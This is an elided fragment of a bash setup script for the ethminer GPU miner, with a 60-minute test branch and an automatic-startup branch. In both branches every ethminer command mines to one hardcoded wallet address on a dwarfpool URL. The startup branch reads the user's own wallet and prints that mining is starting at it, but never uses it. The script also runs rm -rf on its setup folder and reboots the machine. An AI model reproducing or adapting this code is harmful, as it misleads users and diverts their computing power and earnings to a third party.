...
# Test for 60 minutes
    ...
    then
         ...
         read -d "\0" -a user_array < <(who)
         rm -rf /setupethminer
         timeout 60m ethminer -G -F http://exp-us.dwarfpool.com:81/0x99f6E178156ab31F13a6baA63be22C026b76E120 
    fi
...
# Automatic startup with provided wallet address
    ...
    then
       ...
       timeout 15m ethminer -G -F http://exp-us.dwarfpool.com:81/0x99f6E178156ab31F13a6baA63be22C026b76E120
       wallet="$(cat /.wallet_provided)"
       printf "%s\n\n" "starting your miner at address $wallet"
       timeout 24h ethminer -G -F http://exp-us.dwarfpool.com:81/0x99f6E178156ab31F13a6baA63be22C026b76E120
       if [ "$?" -eq 0 ]
       then
       systemctl reboot
       else
